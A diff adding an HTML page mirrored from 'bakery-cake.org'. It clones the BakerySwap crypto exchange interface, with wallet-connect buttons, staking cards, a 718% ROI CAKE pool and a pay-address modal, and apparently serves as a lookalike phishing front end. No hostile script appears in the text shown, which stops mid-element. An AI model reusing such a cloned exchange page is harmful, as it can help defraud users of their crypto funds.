@@ -1,0 +1,3837 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  
+<!-- Mirrored from bakery-cake.org/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jul 2022 11:19:42 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="favicon.ico" />
+    <link rel="shortcut icon" type="image/png" href="favicon.ico" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#ff007a" />
+    <title>BakerySwap</title>
+    <link
+      rel="stylesheet"
+      href="../cdn.jsdelivr.net/npm/bootstrap%404.6.0/dist/css/bootstrap.min.css"
+      integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="navigation.min.css" />
+    <link rel="stylesheet" type="text/css" href="bundle.min.css" media="all" />
+    <link rel="stylesheet" type="text/css" href="style.css" media="all" />
+    <link rel="stylesheet" type="text/css" href="settings.css" media="all" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="networkAlert.css"
+      media="all"
+    />
+  </head>
+  <body>
+    <div id="root">
+      <div class="sc-hrRoet bUpuBs">
+        <div class="sc-iXKTDd dgkyWV">
+          <div id="header_id" class="sc-hORach dKdZth">
+            <div
+              style="align-items: center"
+              class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-krvtoX bekrDb"
+            >
+              <div class="sc-bMVAic sc-bAeIUo bcBsLm">
+                <div onclick="myFunction()" class="sc-bXGyLb iWTNGH imgRoot">
+                  <img
+                    src="images/unfold.af1d0638.svg"
+                    style="height: 28px"
+                    alt=""
+                  />
+                </div>
+                <a href=".html" class="sc-GMQeP cHIzWA">
+                  <div class="sc-lkqHmb gZiitS">
+                    <img
+                      src="images/logo.4e93c681.svg"
+                      style="height: 32px"
+                      alt="logo"
+                    />
+                  </div>
+                  <div class="sc-bdVaJa sc-eNQAEJ sc-exAgwC eKaZQa">
+                    <img
+                      style="margin-left: 5px; margin-top: 0px; height: 20px"
+                      src="images/wordmark.a003062e.svg"
+                      alt="logo"
+                    />
+                  </div>
+                </a>
+              </div>
+              <div class="sc-eLExRp kqOZFi">
+                <div class="sc-bMVAic PDERw">
+                  <div id="chainMode" class="sc-gojNiO cFFRKS">
+                    <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-daURTG cQDweg">
+                      bsc                    </div>
+                  </div>
+                  <div
+                    id="prepare"
+                    style="pointer-events: auto"
+                    class="sc-cQFLBn kGTDoE"
+                  >
+                    <button
+                      style="background-color: rgb(172, 86, 42)"
+                      id="btn-connect"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                    >
+                      Connect Wallet
+                    </button>
+                  </div>
+
+                  <div
+                    id="connected"
+                    style="display: none"
+                    style="pointer-events: auto"
+                    class="sc-cQFLBn kGTDoE"
+                  >
+                    <button
+                      style="background-color: rgb(172, 86, 42)"
+                      id="btn-disconnect"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                    >
+                      Disconnect Wallet
+                    </button>
+                  </div>
+                </div>
+                <div class="sc-iujRgT eRTwLR">
+                  <div class="sc-ksYbfQ bYYqoe">
+                    <button
+                      id="open-settings-dialog-button"
+                      class="sc-kgAjT fCVYuL"
+                    >
+                      <svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        viewBox="0 0 24 24"
+                        fill="none"
+                        stroke="currentColor"
+                        stroke-width="2"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        class="sc-cHGsZl kDPYLZ"
+                      >
+                        <circle cx="12" cy="12" r="3"></circle>
+                        <path
+                          d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"
+                        ></path>
+                      </svg>
+                    </button>
+                    <span class="sc-hmzhuo hfAfEp"
+                      ><div class="sc-jKJlTe drAiDs" style="padding: 1rem">
+                        <div class="css-18hn7mq">Transaction Settings</div>
+                        <div class="sc-jKJlTe drAiDs">
+                          <div class="sc-jKJlTe iHouBp">
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                                Slippage tolerance
+                              </div>
+                              <span style="margin-left: 4px"
+                                ><div class="sc-iwsKbI xkrrd">
+                                  <div class="sc-jTzLTM eKTHYu">
+                                    <svg
+                                      xmlns="http://www.w3.org/2000/svg"
+                                      width="16"
+                                      height="16"
+                                      viewBox="0 0 24 24"
+                                      fill="none"
+                                      stroke="currentColor"
+                                      stroke-width="2"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    >
+                                      <circle cx="12" cy="12" r="10"></circle>
+                                      <path
+                                        d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                      ></path>
+                                      <line
+                                        x1="12"
+                                        y1="17"
+                                        x2="12.01"
+                                        y2="17"
+                                      ></line>
+                                    </svg>
+                                  </div></div
+                              ></span>
+                            </div>
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                              <button class="sc-cvbbAY sc-jWBwVP fZZNwu">
+                                0.1%</button
+                              ><button class="sc-cvbbAY sc-jWBwVP cQFAnb">
+                                0.5%</button
+                              ><button class="sc-cvbbAY sc-jWBwVP fZZNwu">
+                                1%</button
+                              ><button
+                                tabindex="-1"
+                                class="sc-cvbbAY sc-cMljjf RtgPX"
+                              >
+                                <div
+                                  class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH"
+                                >
+                                  <input
+                                    placeholder="0.50"
+                                    color=""
+                                    class="sc-brqgnP hPhOsA"
+                                    value=""
+                                  />%
+                                </div>
+                              </button>
+                            </div>
+                          </div>
+                          <div class="sc-jKJlTe iHouBp">
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                                Transaction deadline
+                              </div>
+                              <span style="margin-left: 4px"
+                                ><div class="sc-iwsKbI xkrrd">
+                                  <div class="sc-jTzLTM eKTHYu">
+                                    <svg
+                                      xmlns="http://www.w3.org/2000/svg"
+                                      width="16"
+                                      height="16"
+                                      viewBox="0 0 24 24"
+                                      fill="none"
+                                      stroke="currentColor"
+                                      stroke-width="2"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    >
+                                      <circle cx="12" cy="12" r="10"></circle>
+                                      <path
+                                        d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                      ></path>
+                                      <line
+                                        x1="12"
+                                        y1="17"
+                                        x2="12.01"
+                                        y2="17"
+                                      ></line>
+                                    </svg>
+                                  </div></div
+                              ></span>
+                            </div>
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <button
+                                tabindex="-1"
+                                class="sc-cvbbAY sc-cMljjf RtgPX"
+                                style="width: 80px"
+                              >
+                                <input
+                                  placeholder="20"
+                                  class="sc-brqgnP hPhOsA"
+                                  value="20"
+                                />
+                              </button>
+                              <div
+                                class="sc-kpOJdX kpIhyN css-1ecm0so"
+                                style="padding-left: 8px"
+                              >
+                                minutes
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="css-18hn7mq">Interface Settings</div>
+                        <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                            <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                              Toggle Expert Mode
+                            </div>
+                            <span style="margin-left: 4px"
+                              ><div class="sc-iwsKbI xkrrd">
+                                <div class="sc-jTzLTM eKTHYu">
+                                  <svg
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    width="16"
+                                    height="16"
+                                    viewBox="0 0 24 24"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    stroke-width="2"
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                  >
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path
+                                      d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                    ></path>
+                                    <line
+                                      x1="12"
+                                      y1="17"
+                                      x2="12.01"
+                                      y2="17"
+                                    ></line>
+                                  </svg>
+                                </div></div
+                            ></span>
+                          </div>
+                          <button
+                            id="toggle-expert-mode-button"
+                            class="sc-gPEVay lhMnYf"
+                          >
+                            <span class="sc-jDwBTQ cmrRaj">On</span
+                            ><span class="sc-jDwBTQ fZFZir">Off</span>
+                          </button>
+                        </div>
+                        <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                            <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                              Toggle Dark Mode
+                            </div>
+                          </div>
+                          <button class="sc-gPEVay lhMnYf">
+                            <span class="sc-jDwBTQ cmrRaj">On</span
+                            ><span class="sc-jDwBTQ fZFZir">Off</span>
+                          </button>
+                        </div>
+                      </div></span
+                    >
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <script>
+          function myFunction() {
+            var x = document.getElementById("myDIV");
+            if (x.style.display === "flex") {
+              x.style.display = "none";
+            } else {
+              x.style.display = "flex";
+            }
+          }
+        </script>
+
+        <div class="sc-ehkqFD eqmiNA">
+          <div class="sc-jjOAeO cQAcLF">
+            <nav style="width: 0" class="sc-emmjRN bTiWHI lol">
+              <a
+                class="sc-cpmLhU kpXpik"
+                href="index-2.html"
+                aria-current="page"
+                ><img
+                  src="images/home.979f9a8a.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Home</span></a
+              >
+              <div id="contactTriggerTrade" class="sc-gFaPwZ behxId ACTIVENAV">
+                <img
+                  src="images/trade.9c696aab.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Trade</span
+                ><img
+                  id="contactTriggerTriangleTrade"
+                  src="images/triangle_down.336fb20e.svg"
+                  class="sc-rBLzX bUNUQb rotate"
+                  style="height: 8px"
+                />
+              </div>
+              <div
+                id="trade"
+                class="sc-fhYwyz hYJzoe ACTIVENAV displayContacts"
+              >
+                <a
+                  class="sc-cpmLhU kpXpik"
+                  href="swap.html"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/exchange.59b59ded.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Exchange</span
+                  ></a
+                ><a
+                  class="sc-cpmLhU kpXpik"
+                  href="liquidity.html"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/liquidity.5e258eb9.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Liquidity</span
+                  ></a
+                >
+              </div>
+              <a class="sc-cpmLhU kpXpik ACTIVENAV" href="#"
+                ><img
+                  src="images/earning_select.f9b4b522.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Earning</span></a
+              >
+              <a href="nft.html"
+                ><div class="sc-gFaPwZ behxId ACTIVENAV">
+                  <img
+                    src="images/nft.02261315.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >NFT Marketplace</span
+                  >
+                </div></a
+              >
+              <div class="sc-CtfFt fyaOpU">
+                <img
+                  src="images/gallery.7e87d6d3.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://gallery.bakeryswap.org/"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY galleryAboutLink"
+                  >Bakery Gallery</a
+                >
+              </div>
+              <a class="sc-cpmLhU kpXpik" href="launchpad.html"
+                ><img
+                  src="images/launchpad.b79cf5ba.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible"
+                  >Launchpad</span
+                ></a
+              ><a class="sc-cpmLhU kpXpik" href="gamification.html"
+                ><img
+                  src="images/game.ebcccdaf.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible"
+                  >Gamification</span
+                ></a
+              ><a
+                target="_blank"
+                rel="noopener noreferrer"
+                href="https://info.bakeryswap.org/"
+                class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                ><img
+                  src="images/info.10a5cc6a.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Info</span></a
+              >
+              <div id="contactTrigger" class="sc-gFaPwZ behxId">
+                <img
+                  src="images/contact.565401ef.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Contact</span
+                ><img
+                  src="images/triangle_down.336fb20e.svg"
+                  class="sc-rBLzX bUNUQb rotate"
+                  style="height: 8px"
+                  id="contactTriggerTriangle"
+                />
+              </div>
+              <div
+                id="contacts"
+                class="sc-fhYwyz hYJzoe ACTIVECALSS displayContacts"
+              >
+                <a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://twitter.com/bakery_swap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/twitter.2da971ef.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Twitter</span
+                  ></a
+                ><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://medium.com/@BakerySwap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/medium.b2a30939.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible">Medium</span></a
+                ><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://t.me/bakeryswap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/contact.565401ef.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Telegram</span
+                  ></a
+                >
+              </div>
+            </nav>
+            <div class="sc-laTMn drSCbm hideCollectionList">
+              <div class="sc-hGoxap bLDQCz">
+                <img
+                  src="images/triangle_left.f2cd4824.svg"
+                  class="sc-fjmCvl dMkYnr"
+                  style="height: 8px"
+                /><span class="sc-bMvGRv htHvGK menu visible"></span>
+              </div>
+              <div class="sc-TFwJa jRKToQ"></div>
+            </div>
+          </div>
+          <div
+            style="display: none"
+            class="sc-bNgurp iXwAge"
+            id="BodyContainerPay"
+          >
+            <div class="sc-iQLKIq eScRiI">
+              <div class="sc-jKJlTe sc-giadOv hmoZve"></div>
+              <div height="0" class="sc-jVODtj Zdrfh">
+                <div class="sc-kUaPvJ jTpnNj"></div>
+              </div>
+              <div class="sc-DNdyV cFItLy">
+                <img
+                  src="../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+                  alt="logo"
+                  style="height: 82px"
+                />
+                <div class="sc-geAPOV kUcFc css-xv7cdu">PancakeSwap</div>
+                <div class="css-1TOKAUy1z">
+                  Deposit CAKE Tokens and earn CAKE                </div>
+              </div>
+              <div class="sc-bJTOcE jWmuoE" style="flex-wrap: wrap">
+                <div class="sc-ugnQR sc-PLyBE dqKBpx">
+                  <div class="sc-dPNhBE cJDENq">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+                      alt="logo"
+                      style="height: 68px"
+                    />
+                  </div>
+                  <div class="sc-kqlzXE cvwYcn css-rix33m">
+                    <div class="sc-iHhHRJ faVZvI">
+                      <span>0.000</span>
+                    </div>
+                  </div>
+                  <div class="css-rpsf7h">CAKE Earned</div>
+                  <div style="margin-top: 40px" class="sc-lnrBVv fTSSia">
+                    <button
+                      disabled=""
+                      style="width: 100%"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik sc-OxbzP jLYjCO"
+                    >
+                      <div class="css-25ozbh mask">Harvest</div>
+                    </button>
+                  </div>
+                </div>
+                <div class="sc-ugnQR sc-PLyBE dqKBpx mes">
+                  <div class="sc-dPNhBE cJDENq">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+                      alt="logo"
+                      style="height: 68px"
+                    />
+                  </div>
+                  <div class="sc-jHXLhC llvait css-rix33m">
+                    <div class="sc-iHhHRJ faVZvI"><span>0.000</span></div>
+                  </div>
+                  <div class="css-d29f92">CAKE Tokens Staked</div>
+                  <div style="margin-top: 40px" class="sc-clBsIJ hGDmaF lomes">
+                    <button
+                      class="sc-bdVaJa sc-iRbamj sc-gipzik sc-bOCYYb lolus"
+                    >
+                      <div>Unstake</div>
+                    </button>
+                    <button
+                      data-target="#get-pay-address"
+                      style="height: 39px; display: flex"
+                      data-toggle="modal"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik sc-bOCYYb dREsTz mesu"
+                    >
+                      <div class="css-25ozbh">+</div>
+                    </button>
+                  </div>
+                </div>
+              </div>
+              <div class="sc-fcxLGG kmuIRO"></div>
+            </div>
+          </div>
+          <div
+            style="display: none"
+            class="sc-bNgurp iXwAge"
+            id="BodyContainer"
+          >
+            <div
+              class="alert alert-danger alert-dismissible fade show mb-0"
+              style="display: none"
+              id="networkAlert"
+              role="alert"
+            >
+              <div class="text-center">
+                <strong id="networkError"></strong>
+              </div>
+              <button
+                type="button"
+                class="close"
+                data-dismiss="alert"
+                aria-label="Close"
+                style="
+                  position: absolute;
+                  right: 0;
+                  top: -1px;
+                  border: none;
+                  background: transparent;
+                "
+              >
+                <span aria-hidden="true">&times;</span>
+              </button>
+            </div>
+            <div class="sc-iQLKIq eScRiI">
+              <div class="sc-jKJlTe sc-giadOv hmoZve"></div>
+              <div height="0" class="sc-jVODtj Zdrfh">
+                <div class="sc-kUaPvJ jTpnNj"></div>
+              </div>
+              <div class="sc-dxZgTM jhbSWw">
+                <div
+                  style="margin-bottom: 20px"
+                  class="sc-eTpRJs gMlAVx css-xv7cdu"
+                >
+                  Earning
+                </div>
+              </div>
+              <div class="sc-guztPN odGBL">
+                <div class="sc-cFlXAS keAeEt ACTIVENAV navs bakeNav">
+                  Earn BAKE<img
+                    src="images/icon_v2.svg"
+                    class="sc-hcnlBt lbQjYv"
+                    width="24"
+                  />
+                </div>
+                <div class="sc-cFlXAS keAeEt navs othersNav">
+                  Earn Others<img
+                    src="images/icon_v2.svg"
+                    class="sc-hcnlBt lbQjYv"
+                    width="24"
+                  />
+                </div>
+                <div class="sc-cFlXAS keAeEt navs nftNav">NFT</div>
+                <div class="sc-cFlXAS keAeEt navs v1Nav">
+                  V1<img
+                    src="images/ended.png"
+                    class="sc-hcnlBt lbQjYv"
+                    width="24"
+                    height="20"
+                  />
+                </div>
+                <div class="sc-cFlXAS keAeEt navs endedNav">Ended</div>
+              </div>
+              <div class="sc-jQMNup iXuTqc">
+                <div class="sc-bJHhxl ftLeoF">
+                  <img
+                    src="images/192x192_App_Icon.png"
+                    width="20px"
+                    height="20px"
+                  />
+                  <div class="sc-fQkuQJ bMNWii css-vurnku">0.000</div>
+                  <div class="sc-TuwoP gdZfYM css-vurnku">To harvest</div>
+                  <button
+                    class="sc-bdVaJa sc-iRbamj sc-gipzik sc-dphlzf lllMTV"
+                  >
+                    Harvest All
+                  </button>
+                </div>
+                <div class="sc-fCPvlr czWBOA">
+                  <div class="sc-epGmkI jeTAgi css-vurnku">staked only</div>
+                  <img src="images/icon_close.png" />
+                </div>
+              </div>
+              <div class="sc-gAmQfK bKdZQA BAKE">
+                <div
+                  style="background-image: url(images/icon_bread_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      style="width: auto; height: 54px"
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">718%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_egg_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/15688.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">DOMI Online</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">DOMI</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">7.14%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_bake_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/15070.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">Notable</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">NBL</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">5.98%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_bake_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7846.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">Unbound</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">UNB</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">6.34%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_btc_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/16091.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">MetaGods</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
